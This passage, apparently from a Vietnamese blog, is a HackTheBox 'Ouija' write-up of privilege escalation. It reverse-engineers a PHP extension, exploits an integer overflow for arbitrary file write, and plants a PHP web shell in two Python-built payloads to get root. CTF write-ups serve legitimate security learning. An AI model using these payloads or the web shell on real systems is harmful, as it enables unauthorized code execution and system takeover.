leila@ouija:~$</pre></div><div style="text-align: left;"><h2>Privilege escalation</h2><div>Kiểm tra các cổng đang mở:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2SMNYHXc7jlY3WCK2K9Miqjr6lPLLNZMFIaU7_lrzx3jQESi0XkLkOVuzNSAKkGG_C3qOl0Ophs2btJIXOGLvPDeoZNmmi2I2PyY81CUvFarvuoyZVloxX59qBeZG5i4rKWpHiRNKdKBirvefig8vEB-8ngfKT5-sb0z-BgXIPprtwzFP6vtBFkBSOSfN/s881/HackTheBox-Ouija-network-port.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="549" data-original-width="881" height="398" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2SMNYHXc7jlY3WCK2K9Miqjr6lPLLNZMFIaU7_lrzx3jQESi0XkLkOVuzNSAKkGG_C3qOl0Ophs2btJIXOGLvPDeoZNmmi2I2PyY81CUvFarvuoyZVloxX59qBeZG5i4rKWpHiRNKdKBirvefig8vEB-8ngfKT5-sb0z-BgXIPprtwzFP6vtBFkBSOSfN/w640-h398/HackTheBox-Ouija-network-port.png" width="640" /></a></div>Thấy rằng port 9999 là dịch vụ mà một chưa được biết. Forward port 9999 khi đó tôi có được website:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQASYrZ0anIC8gFXDLVe3hS8FH9OeTFZ2zG1Itv1Om-ERmFKv5oJKCvF-DahuWFYTBQDLv0Pujf-Sb0OE_CXNxjZut6iFpAlz8XRLmhL80TK_o4dmcWTHmpSDI-fv1PCT0FlCjK2liH8nVqi_ezY0u7rgcmRyjlKQxQcMx_rsX7KoORQBf71oK_Sp_6OhU/s591/HackTheBox-Ouija-website-local-port-9999.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="452" data-original-width="591" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQASYrZ0anIC8gFXDLVe3hS8FH9OeTFZ2zG1Itv1Om-ERmFKv5oJKCvF-DahuWFYTBQDLv0Pujf-Sb0OE_CXNxjZut6iFpAlz8XRLmhL80TK_o4dmcWTHmpSDI-fv1PCT0FlCjK2liH8nVqi_ezY0u7rgcmRyjlKQxQcMx_rsX7KoORQBf71oK_Sp_6OhU/s16000/HackTheBox-Ouija-website-local-port-9999.png" /></a></div>Từ server tôi thấy rằng có một folder <span style="color: #ff00fe;">/development</span> tồn tại, kiểm tra nó tôi thấy mã nguồn của port 9999 trong&nbsp;<span style="color: #ff00fe;">/development/server-management_system_id_0</span>.<div>Đọc file index.php:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQV_CvxTj_ivQHHCOyXHyDm0MAee6U48nU4r6b5WGItuZW5v9m47ZN-EoigfMYwZ5v1igZLa0WQFYFEB_Ps4JOPeBvMkmUrK07hYZ7KcnxpuCaYoCnJeWrRpAKaW0MTeI__nugQ-6lSqXoZOSFEFFTL6ulXkeYQQzL-D1Gb0BwbVIZm_eOFIi5ilshxo53/s920/HackTheBox-Ouija-source-code-index-port-9999.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="649" data-original-width="920" height="452" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQV_CvxTj_ivQHHCOyXHyDm0MAee6U48nU4r6b5WGItuZW5v9m47ZN-EoigfMYwZ5v1igZLa0WQFYFEB_Ps4JOPeBvMkmUrK07hYZ7KcnxpuCaYoCnJeWrRpAKaW0MTeI__nugQ-6lSqXoZOSFEFFTL6ulXkeYQQzL-D1Gb0BwbVIZm_eOFIi5ilshxo53/w640-h452/HackTheBox-Ouija-source-code-index-port-9999.png" width="640" /></a></div>Thấy rằng username và password được truyền vào function&nbsp;<span style="color: #ff00fe;">say_lverifier</span>. Kiểm tra folder lib php.<div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhM1vXbdx-rGwF9ZH4NVaFa0uS-ENn7C_17dSvfgsNUDz6KiQcDDTgQCKKe8SGyC7j3BuAb7M3Ftl0JLojVCRM8JOK_oGqHporgK-hkrzyuK_k-czoUQCSS_Dk-svis4dADMA9rtrBDOnWQnkMKV0Pqm4VimGaMw8b1uAGtQFO3KBCQpgItTDnMLLS0tNvH/s903/HackTheBox-Ouija-check-lib-php.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="903" data-original-width="788" height="640" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhM1vXbdx-rGwF9ZH4NVaFa0uS-ENn7C_17dSvfgsNUDz6KiQcDDTgQCKKe8SGyC7j3BuAb7M3Ftl0JLojVCRM8JOK_oGqHporgK-hkrzyuK_k-czoUQCSS_Dk-svis4dADMA9rtrBDOnWQnkMKV0Pqm4VimGaMw8b1uAGtQFO3KBCQpgItTDnMLLS0tNvH/w558-h640/HackTheBox-Ouija-check-lib-php.png" width="558" /></a></div>Tôi thấy có một file lib&nbsp;<span style="color: #ff00fe;">lverifier.so</span> khá giống với tên function được gọi và nó có quyền đọc. Lấy về và kiểm tra nó.<br /><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnIW6ToW-BdFtwb2XSe6DZitych95F4523t82YtFvUaHjmQ-OvSVpHsC-s8akYJdjtclx9r6LbIMN_S19yfRVOJd0BBD8F61rr1NhvtnsVvr0Z48A-_KwWGPFFd-S2AnqenSY0BdZnSBY2XeuJplQRQII80rHSg6CtGHdn2hyX531e_X_cKaP4VsZo8QVJ/s722/HackTheBox-Ouija-ghidra-lverifier-zif-say-lverifier.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="336" data-original-width="722" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnIW6ToW-BdFtwb2XSe6DZitych95F4523t82YtFvUaHjmQ-OvSVpHsC-s8akYJdjtclx9r6LbIMN_S19yfRVOJd0BBD8F61rr1NhvtnsVvr0Z48A-_KwWGPFFd-S2AnqenSY0BdZnSBY2XeuJplQRQII80rHSg6CtGHdn2hyX531e_X_cKaP4VsZo8QVJ/s16000/HackTheBox-Ouija-ghidra-lverifier-zif-say-lverifier.png" /></a></div>Từ ghidra tôi thấy sau khi gọi function&nbsp;<span style="color: #ff00fe;">say_lverifier</span>&nbsp;chương trình tiếp tục gọi tới&nbsp;<span style="color: #ff00fe;">validating_userinput</span>:<div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBEGxGi0aH3LFmFX-bkKM1ECix6AiufeBQQjp7hQTVjgqqmLDOjrifteV_c52Z4SOzlJgc8s-knp6T2sO27GZMIahw_7OR61Jsagwn8VvbC2NHp5rC8ADSon3YKSiGK-vo2EuzZEJjaPaw5hiRf6FTxBU-BJ-jYeFc0kNPAIoim7SdU8mMTbWI8be-CmT5/s418/HackTheBox-Ouija-ghidra-lverifier-validating-userinput.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="337" data-original-width="418" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBEGxGi0aH3LFmFX-bkKM1ECix6AiufeBQQjp7hQTVjgqqmLDOjrifteV_c52Z4SOzlJgc8s-knp6T2sO27GZMIahw_7OR61Jsagwn8VvbC2NHp5rC8ADSon3YKSiGK-vo2EuzZEJjaPaw5hiRf6FTxBU-BJ-jYeFc0kNPAIoim7SdU8mMTbWI8be-CmT5/s16000/HackTheBox-Ouija-ghidra-lverifier-validating-userinput.png" /></a></div>sVar2 là kích thước của nội dung đầu vào và nó mang kiểu dữ liệu&nbsp;size_t và giá trị tối đa của kiểu dữ liệu này là&nbsp;0xffff và là 65535. Khi tôi trèn một chuỗi ký tự có độ dài lớn hơn số này nó sẽ bị tràn và vào trường hợp kiểm tra trên.</div><div>Sau đó chương trình sẽ gọi tới function&nbsp;event_recorder để thực hiện việc lưu file:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhouwpRj6aqZ-5fbRbrrjqMiMhnnnNU2Osi6Fq9CCPdycI1APSBpOG4UkS56zSI_uvb0GxmrNf_UPIivAJk3uv61OwOX5wkRD2MyIMjrJl_twDkmaCu2qcGmc6kfS7ClW_VlGSeg2rCsaAPJyuczuqqv-B9FDIIGZjp9w8cmh1PwCrIeNeTAScNZUCaOscs/s683/HackTheBox-Ouija-ghidra-lverifier-event-recorder.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="678" data-original-width="683" height="635" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhouwpRj6aqZ-5fbRbrrjqMiMhnnnNU2Osi6Fq9CCPdycI1APSBpOG4UkS56zSI_uvb0GxmrNf_UPIivAJk3uv61OwOX5wkRD2MyIMjrJl_twDkmaCu2qcGmc6kfS7ClW_VlGSeg2rCsaAPJyuczuqqv-B9FDIIGZjp9w8cmh1PwCrIeNeTAScNZUCaOscs/w640-h635/HackTheBox-Ouija-ghidra-lverifier-event-recorder.png" width="640" /></a></div><div>Debug local:</div><div>Giả lập môi trường giống với hệ thống:</div><div>+ cài đặt php 8.2</div><div>+ copy lib&nbsp;<span style="color: #ff00fe;">lverifier.so</span>&nbsp;vào folder <span style="color: #ff00fe;">/usr/lib/php/20220829/</span><br /><div>+ cài đặt gef  <a class="button info" href="https://github.com/hugsy/gef" target="_blank">gef</a><br /><div>file debug.php</div><div><pre lang="php"># cat debug.php
&lt;?php
$payload = readline('Enter: ');
say_lverifier($payload, 'dryu8');
?&gt;</pre>Debug:</div><div>Kiểm tra tràn:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqpSHnu64i_K0H9U_sqd8rpqYu-y-_aPtQ1RFc4iVJhJsEPcHu9SyA35SGBKC6NemXzbXuD44WmR_xOZNf7TK2_PENN-wKO9wuj9ZjR-CwYyoEfsD_8YaGAnYut10NCpbnIez0svXeUQVysc-9TlSMh-PjRkPANuZvL40knnvgTiy7QWAiyKEAIFqf3h1Q/s913/HackTheBox-Ouija-gef-crash-norule.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="657" data-original-width="913" height="460" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqpSHnu64i_K0H9U_sqd8rpqYu-y-_aPtQ1RFc4iVJhJsEPcHu9SyA35SGBKC6NemXzbXuD44WmR_xOZNf7TK2_PENN-wKO9wuj9ZjR-CwYyoEfsD_8YaGAnYut10NCpbnIez0svXeUQVysc-9TlSMh-PjRkPANuZvL40knnvgTiy7QWAiyKEAIFqf3h1Q/w640-h460/HackTheBox-Ouija-gef-crash-norule.png" width="640" /></a></div>Tại đây tôi thấy vị trí file log và nội dung của file log.</div><div>Thực hiện tràn có chủ đích, tạo một payload với số lượng ký tự trong khoảng&nbsp;<span style="color: #ff00fe;">65535+1 -&gt;&nbsp;65535+7</span>&nbsp;<br /><div><pre lang="bash">$ integerOverflow=$((65535 + 5)) # 1-&gt;7
$ pwn cyclic $integerOverflow</pre>Đặt breack point <span style="color: #ff00fe;">event_recoder</span>, sau đó copy toàn bộ payload và trèn vào debug.</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjGBsI9EI89039L5vo5UA-Bdlde6q6Jw8cwA2gZ9sT6z4ptmmMz0EOz49ALXXQLnHT9Pit4Lp1VU4f80h110I4oqpx_CmSymLHGnlEHN5jmF0vT25JrASE6mVQGjFzajI1kCiGhj8FwBPn0hgsu4lty-SeMAxiwPYYQgb2AMtusIBfAyqe_V959Ubo7RLAf/s710/HackTheBox-Ouija-gef-crash-rule.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="151" data-original-width="710" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjGBsI9EI89039L5vo5UA-Bdlde6q6Jw8cwA2gZ9sT6z4ptmmMz0EOz49ALXXQLnHT9Pit4Lp1VU4f80h110I4oqpx_CmSymLHGnlEHN5jmF0vT25JrASE6mVQGjFzajI1kCiGhj8FwBPn0hgsu4lty-SeMAxiwPYYQgb2AMtusIBfAyqe_V959Ubo7RLAf/s16000/HackTheBox-Ouija-gef-crash-rule.png" /></a></div>Khi đó kết quả mà tôi nhận được sẽ có dạng như sau:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKK-1FUXUIrnTjrZGluSDg4T5n-kP7ib3ruXW3e6bJumND9tVv2ZeqvfES8wW7N8HoqoY2hyphenhyphenxgAYtCBAOQ-46BeDQRd7ybTZzzgYOgnfCoO9dRWtuMaxwnLIL_uyEnGhoUQ7OSzNZOWmFCJ7eT8qFjwerLcGR4E9cVLA_gprFxttwsYnLCQH2Yv2Q9Q-Tr/s862/HackTheBox-Ouija-gef-crash-rule-resfult.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="314" data-original-width="862" height="234" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKK-1FUXUIrnTjrZGluSDg4T5n-kP7ib3ruXW3e6bJumND9tVv2ZeqvfES8wW7N8HoqoY2hyphenhyphenxgAYtCBAOQ-46BeDQRd7ybTZzzgYOgnfCoO9dRWtuMaxwnLIL_uyEnGhoUQ7OSzNZOWmFCJ7eT8qFjwerLcGR4E9cVLA_gprFxttwsYnLCQH2Yv2Q9Q-Tr/w640-h234/HackTheBox-Ouija-gef-crash-rule-resfult.png" width="640" /></a></div>Tên file và nội dung file đã được ghi đè. Xác định khoảng cách các ký tự bị ghi đè.</div><div>Tôi có:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3KIXy6bfrTpvP27Ad5m5NnAfDO-hQY606nymPqETv-orouYWUYv9T71wMNy0G7Tl1UwmTTsmj4-i71V5OcRIbyTBn3WMra2Emqvn8QOVdYglxh_JyumWfhRcAmMjzfwiMRqXBxXR_EkIvTQN_bRtnyHs0-l0xKaYCSzdRhVWyArzNNIVIldcq_4GE2Gbl/s945/HackTheBox-Ouija-gef-crash-rule-param-event-recorder.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="391" data-original-width="945" height="264" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3KIXy6bfrTpvP27Ad5m5NnAfDO-hQY606nymPqETv-orouYWUYv9T71wMNy0G7Tl1UwmTTsmj4-i71V5OcRIbyTBn3WMra2Emqvn8QOVdYglxh_JyumWfhRcAmMjzfwiMRqXBxXR_EkIvTQN_bRtnyHs0-l0xKaYCSzdRhVWyArzNNIVIldcq_4GE2Gbl/w640-h264/HackTheBox-Ouija-gef-crash-rule-param-event-recorder.png" width="640" /></a></div>Khi đó tôi biết rằng:<div>pathFile: p sẽ nằm trong khoảng từ ký tự 17 đến ký tự 800</div><div>p = payload[16:800]<br /><div>contentFile: w sẽ nằm trong khoảng từ ký tự 129 đến ký tự 800<br /><div>w = payload[128:800]<br /><div>Khi đó để khai thác được tôi có 2 con đường như sau:</div><div><h3 style="text-align: left;">way one</h3><div>Trèn các ký <span style="color: #ff00fe;">/</span>&nbsp;để tạo đủ các khoảng payload. Khi đó tôi có quyền ghi file tùy ý. Để có thể tạo ghi file có payload php. Trước tiên tôi tạo một folder với tên là nội dung của payload:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqiYxX-8avqxCeqdXA2XjH78krJerANQm2PcqEwAKbUUmf1_-mwhOE6kOqgvozRzJoAc3O2jhsWP3v8t6XlNeUMZZ1hR4t723kC9EHaEvitZJqh6rD_moRCEyjYWfJTDwV_P4sja5KOW__D1BKGaTp-0UdyaX709nIaU9UzabsGZvRDr-WDVrbUQyZoyuL/s1118/HackTheBox-Ouija-pe-create-payload.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="157" data-original-width="1118" height="90" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqiYxX-8avqxCeqdXA2XjH78krJerANQm2PcqEwAKbUUmf1_-mwhOE6kOqgvozRzJoAc3O2jhsWP3v8t6XlNeUMZZ1hR4t723kC9EHaEvitZJqh6rD_moRCEyjYWfJTDwV_P4sja5KOW__D1BKGaTp-0UdyaX709nIaU9UzabsGZvRDr-WDVrbUQyZoyuL/w640-h90/HackTheBox-Ouija-pe-create-payload.png" width="640" /></a></div>Sao khi tạo xong một folder với payload như trên tôi gắn một soft link đến thư mục chính. Bây giờ tôi chỉ cần tạo tải trọng như sau, lưu ý phải đủ 800 ký tự.</div><div>Với các ký tự đầu tiên là <span style="color: #ff00fe;">///...</span>&nbsp;và các ký tự cuối cùng là <span style="color: #ff00fe;">/dev/shm/&lt;?php system($_REQUEST["cmd"]);?&gt;/dryu</span>&nbsp;<br /><div>Khi đó tôi có một payload như sau:</div><div><pre lang="python" style="text-align: left;">$ python3
Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; payload="/dev/shm/&lt;?php system($_REQUEST[\&quot;cmd\&quot;]);?&gt;/dryu"
&gt;&gt;&gt; payload="/"*(800 - len(payload)) + payload
&gt;&gt;&gt; print(len(payload))
800
&gt;&gt;&gt; import urllib.parse
&gt;&gt;&gt; urllib.parse.quote(payload) + "a"*(65535 + 5 - len(payload))
PAYLOAD
</pre></div><div><div>Copy toàn bộ payload và gửi tới username trên port 9999:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEip-C34TYSvIQ4X3WYV4why3lk0Zzoo7Hlo2w9VzEQN1SgSCVPlVCiwcOXKhu4VfpA8taxQqDxgsP_O_0LaQg9Lbv4Csaflzm4VQBGBGlnVYkomOKhAEJUSpykfosIn2NvDLUznZz1ysgwt4C52VkcE-10no9R_dceXQhaZBVfPqwTLgxlpPeqoiO1I3MVa/s958/HackTheBox-Ouija-burp-send-payload.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="413" data-original-width="958" height="276" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEip-C34TYSvIQ4X3WYV4why3lk0Zzoo7Hlo2w9VzEQN1SgSCVPlVCiwcOXKhu4VfpA8taxQqDxgsP_O_0LaQg9Lbv4Csaflzm4VQBGBGlnVYkomOKhAEJUSpykfosIn2NvDLUznZz1ysgwt4C52VkcE-10no9R_dceXQhaZBVfPqwTLgxlpPeqoiO1I3MVa/w640-h276/HackTheBox-Ouija-burp-send-payload.png" width="640" /></a></div>Khi đó tôi thấy file&nbsp;<span style="color: #ff00fe;">reverse.php</span>&nbsp;đã được tạo:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXriiV52GyybzpiC7V5GKAsKGBfy_3FlQMTbjcb7XufRsGvLkJwr_tNpx9FTYHv11fBFbbUlZWgYl-HHzE2bMia4K331UoUG6TpRi0sKy0nzXwYOYetJug9BUwWwb6-GIusQEy7V4ld1UwELAh_LMqyBjhWDrkarTZoj3w6-yjepLHeGStn9xE43CmROeN/s684/HackTheBox-Ouija-pe-create-file-revese.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="66" data-original-width="684" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXriiV52GyybzpiC7V5GKAsKGBfy_3FlQMTbjcb7XufRsGvLkJwr_tNpx9FTYHv11fBFbbUlZWgYl-HHzE2bMia4K331UoUG6TpRi0sKy0nzXwYOYetJug9BUwWwb6-GIusQEy7V4ld1UwELAh_LMqyBjhWDrkarTZoj3w6-yjepLHeGStn9xE43CmROeN/s16000/HackTheBox-Ouija-pe-create-file-revese.png" /></a></div>Thực thi rce:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbQbkXSX-DH1frrfM_qUSrYSKbNPyDSmkBA85mdGfKCUro-ZnkOTnW8MMqmL0Ua8Wj1KrMGraAGMif1sHCfLUH793p_h3ZJbb8fI6aBWTbku-r-qb7K0oWvCmC3NFyKG2lHpYcAXd9dTTGHzSwlK9U01JO7_Dn4PPz7gfZTxovfh8KdgtRNZfMjXJrdK_6/s375/HackTheBox-Ouija-pe-rce.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="85" data-original-width="375" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbQbkXSX-DH1frrfM_qUSrYSKbNPyDSmkBA85mdGfKCUro-ZnkOTnW8MMqmL0Ua8Wj1KrMGraAGMif1sHCfLUH793p_h3ZJbb8fI6aBWTbku-r-qb7K0oWvCmC3NFyKG2lHpYcAXd9dTTGHzSwlK9U01JO7_Dn4PPz7gfZTxovfh8KdgtRNZfMjXJrdK_6/s16000/HackTheBox-Ouija-pe-rce.png" /></a></div>Tạo kết nối:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnrBjegLhm5M3-wqEXobLlpCkgNTU7c0GfnGa43-bd07tn-CJ7NXp6V3p1r1TP9QFCNBnP2WJMvJJbDim8JMRND6UAeCdYjhXN4k5VENsg8zylnI8PglHnTg8JlzhstcI_A-amlwl0m7Wlw8HBfuBc_K0xXNG_vpAw_1vKcmxCcI0QX23TTUoLsxZiPTnJ/s554/HackTheBox-Ouija-shell-root.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="199" data-original-width="554" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnrBjegLhm5M3-wqEXobLlpCkgNTU7c0GfnGa43-bd07tn-CJ7NXp6V3p1r1TP9QFCNBnP2WJMvJJbDim8JMRND6UAeCdYjhXN4k5VENsg8zylnI8PglHnTg8JlzhstcI_A-amlwl0m7Wlw8HBfuBc_K0xXNG_vpAw_1vKcmxCcI0QX23TTUoLsxZiPTnJ/s16000/HackTheBox-Ouija-shell-root.png" /></a></div><div><div><h3>way two</h3></div><div style="text-align: left;">Trong function&nbsp;<span style="color: #ff00fe;">event_recorder</span> tôi thấy được gọi tới function&nbsp;<span style="color: #ff00fe;">get_clean_size</span>&nbsp;<br /><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgcpah2HWj4QKCmADSVCAY4kbNbKt7abbfTDpWVIX-OVIwHfYCHORwgzJYv1tD2LwCQfqCKYZQ6dSbRejRzV_Yuchjg6dfkGOHICACNB8Y6mLxo4rbz7uXtI3ER0xdT7_yUgvanx5XuWGKocCuns02PvpBwRBlRgB9GLO8VgVC7ddO_uMKviCs3J-c3NwoT/s452/HackTheBox-Ouija-ghidra-lverifier-get-clean-size.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="424" data-original-width="452" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgcpah2HWj4QKCmADSVCAY4kbNbKt7abbfTDpWVIX-OVIwHfYCHORwgzJYv1tD2LwCQfqCKYZQ6dSbRejRzV_Yuchjg6dfkGOHICACNB8Y6mLxo4rbz7uXtI3ER0xdT7_yUgvanx5XuWGKocCuns02PvpBwRBlRgB9GLO8VgVC7ddO_uMKviCs3J-c3NwoT/s16000/HackTheBox-Ouija-ghidra-lverifier-get-clean-size.png" /></a></div>Hàm này sẽ kiểm tra các ký tự của pathFile nếu gặp phải ký tự \n - new line thì nó sẽ trả về giá trị của biến lVar2 - kích thước của pathFile được đính toán lại.</div><div style="text-align: left;">Khi đó tôi có 16 ký tự đầu tiên là các byte bất kỳ.</div><div style="text-align: left;">Tiếp theo là tên file và ký tự new line.</div><div style="text-align: left;">sau đó là những byte tiếp theo sao cho số ký tự hợp với những ký tự trước đó đủ 65535 + 5 ký tự.&nbsp;<div>Khi đó tôi có khai thác như sau:</div><div><pre lang="python">$ python3
Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; payload="a"*16 + "rev.php\n"
&gt;&gt;&gt; payload+="a"*(128-len(payload)) + "&lt;?php system($_REQUEST[\&quot;cmd\&quot;]);?&gt;"
&gt;&gt;&gt; payload+="a"*(800-len(payload))
&gt;&gt;&gt; import urllib.parse
urllib.parse.quote(payload) + "a"*(65535 + 5 - len(payload))</pre></div><div>Copy toàn bộ payload và gửi tới username trên port 9999:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg563n7lmGv4Hoa6WWv0Z4HFWfDVysIZq9JkRw6NBo9S2JybV0bjYyqSHq5OImVaHXVR4zz-xWjUqz3fPUj5YGaWsG3TKIh6rVQ7_a6ACMppi7mHvAgkjppYwkA1WXZx8JJKf5Frsblt1skPaa66z5-Jxf1FwV0BDtPcuSkMrg2ueS7MZSdlsdfQYN9rd4z/s962/HackTheBox-Ouija-burp-send-payload-new-line.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="544" data-original-width="962" height="362" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg563n7lmGv4Hoa6WWv0Z4HFWfDVysIZq9JkRw6NBo9S2JybV0bjYyqSHq5OImVaHXVR4zz-xWjUqz3fPUj5YGaWsG3TKIh6rVQ7_a6ACMppi7mHvAgkjppYwkA1WXZx8JJKf5Frsblt1skPaa66z5-Jxf1FwV0BDtPcuSkMrg2ueS7MZSdlsdfQYN9rd4z/w640-h362/HackTheBox-Ouija-burp-send-payload-new-line.png" width="640" /></a></div>Khi đó tôi thấy file&nbsp;<span style="color: #ff00fe;">rev.php</span>&nbsp;đã được tạo:<br /><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-_dnTUwp_sshfVWHp3yNne8331iQ85Zqiq9ImW3adkNeNyqoO-ibk44uVmxBJypHPlRZkIbXbUc6ct_WOLvGxyqgg3Zw9cODeHgT0pzMARFgbJKF9aQMqDIT-IHM8QcjEyA0XW-eaLIiwyW9SG9suExj7n6rZwt_2eiZElCpj69EB2-jUqQuXsglAfOyK/s652/HackTheBox-Ouija-pe-create-file-rev-php.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="100" data-original-width="652" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh-_dnTUwp_sshfVWHp3yNne8331iQ85Zqiq9ImW3adkNeNyqoO-ibk44uVmxBJypHPlRZkIbXbUc6ct_WOLvGxyqgg3Zw9cODeHgT0pzMARFgbJKF9aQMqDIT-IHM8QcjEyA0XW-eaLIiwyW9SG9suExj7n6rZwt_2eiZElCpj69EB2-jUqQuXsglAfOyK/s16000/HackTheBox-Ouija-pe-create-file-rev-php.png" /></a></div>Thực thi rce:</div><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhxuApHgiqUkTiAn8InD21C2n3fFiYPovErlv80JYglzdSAoLSBJy-K4KGTMgkv8qK5G3lv92zxbATN2t-noKimtopnYv-OMwGpoKm-WZM4Hkvle3MpBePUv4yyAqVQWcgW5_iT9qVEiKMS_tnZXTgk5tQ-LuhNanE0V7g7E7AtAT5DeK7AT140szQR1Bmj/s362/HackTheBox-Ouija-pe-rce-new-line.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="86" data-original-width="362" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhxuApHgiqUkTiAn8InD21C2n3fFiYPovErlv80JYglzdSAoLSBJy-K4KGTMgkv8qK5G3lv92zxbATN2t-noKimtopnYv-OMwGpoKm-WZM4Hkvle3MpBePUv4yyAqVQWcgW5_iT9qVEiKMS_tnZXTgk5tQ-LuhNanE0V7g7E7AtAT5DeK7AT140szQR1Bmj/s16000/HackTheBox-Ouija-pe-rce-new-line.png" /></a></div>Lấy kết nối reverse và tôi đã có quyền truy cập với root.<br /><div style="text-align: left;"><div>Ngoài lề một lát.</div><div>Khi debug file so có ai để ý tới:</div><div><span style="color: #ff00fe;">/home/kali/Desktop/programming/CHALLS/hackthebox-MACHINE-DEV/ouija/vulnerable_PHP_extention/php-src/ext/lverifier</span></div><div>Thực sự khi thấy điều này tôi đã cười mất vài phút. :D</div><div><br /></div><div><br /></div></div></div></div></div>